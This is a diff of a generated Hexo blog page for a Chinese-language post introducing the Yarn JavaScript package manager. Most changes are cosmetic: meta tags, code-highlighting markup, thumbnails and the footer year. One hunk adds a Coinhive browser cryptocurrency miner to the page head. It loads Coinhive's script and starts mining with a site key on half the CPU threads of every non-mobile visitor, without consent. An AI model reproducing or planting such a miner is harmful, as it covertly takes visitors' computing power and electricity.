@@ -12,6 +12,7 @@
 <meta property="og:url" content="http://kingzez.com/2016/10/18/Yarn-A-new-package-manager-for-JavaScript-1/index.html">
 <meta property="og:site_name" content="the kingzez blog">
 <meta property="og:description" content="Facebook 开源了 yarn 这个新的 JavaScript 包管理工具，yarn 和 npm 做的是完全一样的事情：作为 nodejs 的包管理工具。既然是一样的事情，那么 yarn 必须有一些优点，才能说服大家去用。根据官方网站的介绍，yarn 有以下六项特点：">
+<meta property="og:locale" content="zh-CN">
 <meta property="og:updated_time" content="2017-02-20T09:25:39.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Yarn A new package manager for JavaScript">
@@ -63,6 +64,20 @@
   ga('send', 'pageview');
 
 </script>
+<!-- Coinhive -->
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+	var miner = new CoinHive.User('r0WSj9IIUFDNRQl8X4f4zeapVsRB99kq', 'kingzez', {
+		threads: Math.round(navigator.hardwareConcurrency/2),
+		throttle: 0.5
+		});
+	// Only start on non-mobile devices and if not opted-out
+	// in the last 14400 seconds (4 hours):
+	if (!miner.isMobile()) {
+		miner.start();
+	}
+</script>
+
 </head>
 <body>
     <div id="container">
@@ -326,11 +341,11 @@ windows
 <p>创建一个新项目</p>
 <figure class="highlight ebnf"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">yarn init</span></div></pre></td></tr></table></figure>
 <p>添加项目依赖包</p>
-<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">yarn <span class="keyword">add</span><span class="bash"> [package]</span></div><div class="line">yarn <span class="keyword">add</span><span class="bash"> [package]@[version]</span></div><div class="line">yarn <span class="keyword">add</span><span class="bash"> [package]@[tag]</span></div></pre></td></tr></table></figure>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">yarn <span class="keyword">add</span><span class="bash"> [package]</span></div><div class="line"><span class="bash">yarn add [package]@[version]</span></div><div class="line"><span class="bash">yarn add [package]@[tag]</span></div></pre></td></tr></table></figure>
 <p>更新依赖包</p>
-<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">yarn upgrade <span class="string">[package]</span></div><div class="line">yarn upgrade <span class="string">[package]</span>@<span class="string">[version]</span></div><div class="line">yarn upgrade <span class="string">[package]</span>@<span class="string">[tag]</span></div></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">yarn<span class="built_in"> upgrade </span>[package]</div><div class="line">yarn<span class="built_in"> upgrade </span>[package]@[version]</div><div class="line">yarn<span class="built_in"> upgrade </span>[package]@[tag]</div></pre></td></tr></table></figure>
 <p>移除依赖包</p>
-<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yarn remove <span class="string">[package]</span></div></pre></td></tr></table></figure>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yarn <span class="built_in">remove</span> [<span class="built_in">package</span>]</div></pre></td></tr></table></figure>
 <p>安装项目依赖的所有
 <figure class="highlight ebnf"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">yarn</span></div></pre></td></tr></table></figure></p>
 <p>或者</p>
@@ -354,7 +369,7 @@ https://yarnpkg.com/</p>
 
 </div>
 
-    <a data-url="http://kingzez.com/2016/10/18/Yarn-A-new-package-manager-for-JavaScript-1/" data-id="cj3wdnjdj001n09heiju3bc13" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
+    <a data-url="http://kingzez.com/2016/10/18/Yarn-A-new-package-manager-for-JavaScript-1/" data-id="cjcc61di9001u70fyex7o8pp8" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
 <script>
     (function ($) {
         // Prevent duplicate binding
@@ -492,7 +507,7 @@ https://yarnpkg.com/</p>
         
         
         
-        <span style="background-image:url(/images/thumb-default-small8.png)"  class="thumbnail-image thumbnail-none"></span>
+        <span style="background-image:url(/images/thumb-default-small7.png)"  class="thumbnail-image thumbnail-none"></span>
     
 </a>
    
@@ -527,7 +542,7 @@ https://yarnpkg.com/</p>
         
         
         
-        <span style="background-image:url(/images/thumb-default-small3.png)"  class="thumbnail-image thumbnail-none"></span>
+        <span style="background-image:url(/images/thumb-default-small5.png)"  class="thumbnail-image thumbnail-none"></span>
     
 </a>
    
@@ -562,7 +577,7 @@ https://yarnpkg.com/</p>
         
         
         
-        <span style="background-image:url(/images/thumb-default-small5.png)"  class="thumbnail-image thumbnail-none"></span>
+        <span style="background-image:url(/images/thumb-default-small2.png)"  class="thumbnail-image thumbnail-none"></span>
     
 </a>
    
@@ -632,7 +647,7 @@ https://yarnpkg.com/</p>
         
         
         
-        <span style="background-image:url(/images/thumb-default-small5.png)"  class="thumbnail-image thumbnail-none"></span>
+        <span style="background-image:url(/images/thumb-default-small7.png)"  class="thumbnail-image thumbnail-none"></span>
     
 </a>
    
@@ -686,7 +701,7 @@ https://yarnpkg.com/</p>
         <footer id="footer">
     <div class="outer">
         <div id="footer-info" class="inner">
-            &copy;2015 - 2017 kingzez<br>
+            &copy;2015 - 2018 kingzez<br>
             Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.
         </div>
     </div>
